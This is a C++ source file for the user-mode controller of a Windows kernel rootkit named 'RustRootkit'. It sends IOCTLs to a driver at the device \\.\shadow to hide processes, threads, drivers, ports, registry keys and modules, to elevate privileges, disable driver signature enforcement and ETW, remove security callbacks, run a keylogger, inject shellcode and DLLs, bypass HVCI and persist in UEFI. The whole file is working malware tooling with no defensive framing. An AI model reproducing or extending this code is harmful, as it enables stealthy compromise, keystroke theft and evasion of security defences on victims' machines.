#include "RustRootkit.hpp"
#include <iostream>

RustRootkit::RustRootkit() : hDevice(INVALID_HANDLE_VALUE) {}

RustRootkit::~RustRootkit() {
    Close();
}

bool RustRootkit::Initialize() {
    hDevice = CreateFileW(
        L"\\\\.\\shadow",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    return hDevice != INVALID_HANDLE_VALUE;
}

void RustRootkit::Close() {
    if (hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(hDevice);
        hDevice = INVALID_HANDLE_VALUE;
    }
}

bool RustRootkit::SendIoctl(DWORD code, void* in, size_t inSize, void* out, size_t outSize, DWORD* bytesReturned) {
    if (hDevice == INVALID_HANDLE_VALUE) return false;
    DWORD ret = 0;
    BOOL result = DeviceIoControl(hDevice, code, in, static_cast<DWORD>(inSize), out, static_cast<DWORD>(outSize), &ret, NULL);
    if (bytesReturned) *bytesReturned = ret;
    return result == TRUE;
}

// --- Process ---
bool RustRootkit::ElevateProcess(size_t pid) {
    TargetProcess tp = {};
    tp.pid = pid;
    return SendIoctl(IO_ELEVATE, &tp, sizeof(tp));
}

bool RustRootkit::HideProcess(size_t pid) {
    TargetProcess tp = {};
    tp.pid = pid;
    tp.enable = true;
    return SendIoctl(IO_HIDE_PROC, &tp, sizeof(tp));
}

bool RustRootkit::UnhideProcess(size_t pid) {
    TargetProcess tp = {};
    tp.pid = pid;
    tp.enable = false;
    return SendIoctl(IO_HIDE_PROC, &tp, sizeof(tp));
}

bool RustRootkit::TerminateProcess(size_t pid) {
    TargetProcess tp = {};
    tp.pid = pid;
    return SendIoctl(IO_TERM_PROC, &tp, sizeof(tp));
}

bool RustRootkit::SetProcessSignature(size_t pid, size_t signer, size_t type) {
    TargetProcess tp = {};
    tp.pid = pid;
    tp.sg = signer;
    tp.tp = type;
    return SendIoctl(IO_SIG_PROC, &tp, sizeof(tp));
}

bool RustRootkit::ProtectProcess(size_t pid, bool enable) {
    TargetProcess tp = {};
    tp.pid = pid;
    tp.enable = enable;
    return SendIoctl(IO_PROT_PROC, &tp, sizeof(tp));
}

std::vector<TargetProcess> RustRootkit::EnumerateProcesses(Abyss::OPT_TYPE option) {
    std::vector<TargetProcess> processes(512); // Increased buffer
    TargetProcess input = {};
    input.options = option;
    
    DWORD bytesReturned = 0;
    if (SendIoctl(IO_ENUM_PROC, &input, sizeof(input), processes.data(), static_cast<DWORD>(processes.size() * sizeof(TargetProcess)), &bytesReturned)) {
        size_t count = bytesReturned / sizeof(TargetProcess);
        processes.resize(count);
        return processes;
    }
    return {};
}

// --- Thread ---
bool RustRootkit::HideThread(size_t tid) {
    TargetThread tt = {};
    tt.tid = tid;
    tt.enable = true;
    return SendIoctl(IO_HIDE_THR, &tt, sizeof(tt));
}

bool RustRootkit::UnhideThread(size_t tid) {
    TargetThread tt = {};
    tt.tid = tid;
    tt.enable = false;
    return SendIoctl(IO_HIDE_THR, &tt, sizeof(tt));
}

bool RustRootkit::ProtectThread(size_t tid, bool enable) {
    TargetThread tt = {};
    tt.tid = tid;
    tt.enable = enable;
    return SendIoctl(IO_PROT_THR, &tt, sizeof(tt));
}

std::vector<TargetThread> RustRootkit::EnumerateThreads(Abyss::OPT_TYPE option) {
    std::vector<TargetThread> threads(100);
    TargetThread input = {};
    input.options = option;
    DWORD bytes = 0;
    if (SendIoctl(IO_ENUM_THR, &input, sizeof(input), threads.data(), static_cast<DWORD>(threads.size() * sizeof(TargetThread)), &bytes)) {
        threads.resize(bytes / sizeof(TargetThread));
        return threads;
    }
    return {};
}

// --- Driver ---
bool RustRootkit::HideDriver(const std::wstring& name) {
    TargetDriver td = {};
    wcsncpy_s(td.name, name.c_str(), 255);
    td.enable = true;
    return SendIoctl(IO_HIDE_DRV, &td, sizeof(td));
}

bool RustRootkit::UnhideDriver(const std::wstring& name) {
    TargetDriver td = {};
    wcsncpy_s(td.name, name.c_str(), 255);
    td.enable = false;
    return SendIoctl(IO_HIDE_DRV, &td, sizeof(td));
}

bool RustRootkit::BlockDriver(const std::wstring& name, bool enable) {
    TargetDriver td = {};
    wcsncpy_s(td.name, name.c_str(), 255);
    td.enable = enable;
    return SendIoctl(IO_BLOCK_DRV, &td, sizeof(td));
}

std::vector<DriverInfo> RustRootkit::EnumerateDrivers() {
    std::vector<DriverInfo> drivers(100);
    DWORD bytes = 0;
    if (SendIoctl(IO_ENUM_DRV, nullptr, 0, drivers.data(), static_cast<DWORD>(drivers.size() * sizeof(DriverInfo)), &bytes)) {
        drivers.resize(bytes / sizeof(DriverInfo));
        return drivers;
    }
    return {};
}

// --- Misc ---
bool RustRootkit::SetDSE(bool enable) {
    DSE dse = { enable };
    return SendIoctl(IO_DSE_SET, &dse, sizeof(dse));
}

size_t RustRootkit::InitKeylogger() {
    size_t addr = 0;
    DWORD bytes = 0;
    if (SendIoctl(IO_KEYLOG, nullptr, 0, &addr, sizeof(addr), &bytes)) {
        return addr;
    }
    return 0;
}

bool RustRootkit::SetETWTI(bool enable) {
    ETWTI etw = { enable };
    return SendIoctl(IO_ETW_SET, &etw, sizeof(etw));
}

// --- Network ---
bool RustRootkit::HidePort(unsigned short port, Abyss::PROTO proto, int type, bool enable) {
    TargetPort tp = {};
    tp.port_number = port;
    tp.protocol = proto;
    tp.port_type = type;
    tp.enable = enable;
    return SendIoctl(IO_PORT_HIDE, &tp, sizeof(tp));
}

// --- Callback ---
std::vector<CallbackInfoOutput> RustRootkit::EnumerateCallbacks(Abyss::CB_TYPE type) {
    std::vector<CallbackInfoOutput> callbacks(100);
    CallbackInfoInput input = {};
    input.callback = type;
    DWORD bytes = 0;
    if (SendIoctl(IO_CB_ENUM, &input, sizeof(input), callbacks.data(), static_cast<DWORD>(callbacks.size() * sizeof(CallbackInfoOutput)), &bytes)) {
        callbacks.resize(bytes / sizeof(CallbackInfoOutput));
        return callbacks;
    }
    return {};
}

std::vector<CallbackInfoOutput> RustRootkit::EnumerateRemovedCallbacks(Abyss::CB_TYPE type) {
    std::vector<CallbackInfoOutput> callbacks(100);
    CallbackInfoInput input = {};
    input.callback = type;
    DWORD bytes = 0;
    if (SendIoctl(IO_CB_REMLIST, &input, sizeof(input), callbacks.data(), static_cast<DWORD>(callbacks.size() * sizeof(CallbackInfoOutput)), &bytes)) {
        callbacks.resize(bytes / sizeof(CallbackInfoOutput));
        return callbacks;
    }
    return {};
}

bool RustRootkit::RemoveCallback(Abyss::CB_TYPE type, size_t index) {
    CallbackInfoInput input = {};
    input.callback = type;
    input.index = index;
    return SendIoctl(IO_CB_REM, &input, sizeof(input));
}

bool RustRootkit::RestoreCallback(Abyss::CB_TYPE type, size_t index) {
    CallbackInfoInput input = {};
    input.callback = type;
    input.index = index;
    return SendIoctl(IO_CB_RES, &input, sizeof(input));
}

// --- Registry ---
bool RustRootkit::ProtectRegistryValue(const std::wstring& key, const std::wstring& value, bool enable) {
    TargetRegistry tr = {};
    wcsncpy_s(tr.key, key.c_str(), 255);
    wcsncpy_s(tr.value, value.c_str(), 255);
    tr.enable = enable;
    return SendIoctl(IO_REG_VAL_P, &tr, sizeof(tr));
}

bool RustRootkit::ProtectRegistryKey(const std::wstring& key, bool enable) {
    TargetRegistry tr = {};
    wcsncpy_s(tr.key, key.c_str(), 255);
    tr.enable = enable;
    return SendIoctl(IO_REG_KEY_P, &tr, sizeof(tr));
}

bool RustRootkit::HideRegistryKey(const std::wstring& key, bool enable) {
    TargetRegistry tr = {};
    wcsncpy_s(tr.key, key.c_str(), 255);
    tr.enable = enable;
    return SendIoctl(IO_REG_KEY_H, &tr, sizeof(tr));
}

bool RustRootkit::HideRegistryValue(const std::wstring& key, const std::wstring& value, bool enable) {
    TargetRegistry tr = {};
    wcsncpy_s(tr.key, key.c_str(), 255);
    wcsncpy_s(tr.value, value.c_str(), 255);
    tr.enable = enable;
    return SendIoctl(IO_REG_VAL_H, &tr, sizeof(tr));
}

// --- Module ---
std::vector<ModuleInfo> RustRootkit::EnumerateModules(size_t pid) {
    std::vector<ModuleInfo> modules(100);
    TargetProcess tp = {};
    tp.pid = pid;
    DWORD bytes = 0;
    if (SendIoctl(IO_MOD_ENUM, &tp, sizeof(tp), modules.data(), static_cast<DWORD>(modules.size() * sizeof(ModuleInfo)), &bytes)) {
        modules.resize(bytes / sizeof(ModuleInfo));
        return modules;
    }
    return {};
}

bool RustRootkit::HideModule(size_t pid, const std::wstring& moduleName) {
    TargetModule tm = {};
    tm.pid = pid;
    wcsncpy_s(tm.module_name, moduleName.c_str(), 255);
    return SendIoctl(IO_MOD_HIDE, &tm, sizeof(tm));
}

// --- Injection ---
bool RustRootkit::InjectShellcodeThread(size_t pid, const std::wstring& path) {
    TargetInjection ti = {};
    ti.pid = pid;
    wcsncpy_s(ti.path, path.c_str(), 255);
    return SendIoctl(IO_INJ_SH_T, &ti, sizeof(ti));
}

bool RustRootkit::InjectShellcodeAPC(size_t pid, const std::wstring& path) {
    TargetInjection ti = {};
    ti.pid = pid;
    wcsncpy_s(ti.path, path.c_str(), 255);
    return SendIoctl(IO_INJ_SH_A, &ti, sizeof(ti));
}

bool RustRootkit::InjectShellcodeHijack(size_t pid, const std::wstring& path) {
    TargetInjection ti = {};
    ti.pid = pid;
    wcsncpy_s(ti.path, path.c_str(), 255);
    return SendIoctl(IO_INJ_SH_H, &ti, sizeof(ti));
}

bool RustRootkit::InjectDLLThread(size_t pid, const std::wstring& path) {
    TargetInjection ti = {};
    ti.pid = pid;
    wcsncpy_s(ti.path, path.c_str(), 255);
    return SendIoctl(IO_INJ_DLL_T, &ti, sizeof(ti));
}

bool RustRootkit::InjectDLLAPC(size_t pid, const std::wstring& path) {
    TargetInjection ti = {};
    ti.pid = pid;
    wcsncpy_s(ti.path, path.c_str(), 255);
    return SendIoctl(IO_INJ_DLL_A, &ti, sizeof(ti));
}

// --- God Mode ---
bool RustRootkit::BypassHVCI(size_t pid) {
    TargetProcess tp = {};
    tp.pid = pid;
    return SendIoctl(IO_HVCI_OFF, &tp, sizeof(tp));
}

bool RustRootkit::PersistUEFI(const std::wstring& path) {
    TargetInjection ti = {};
    ti.pid = 0; // Not used
    wcsncpy_s(ti.path, path.c_str(), 255);
    return SendIoctl(IO_UEFI_SET, &ti, sizeof(ti));
}

bool RustRootkit::CheckAntiVM() {
    return SendIoctl(IO_AV_CHECK, nullptr, 0);
}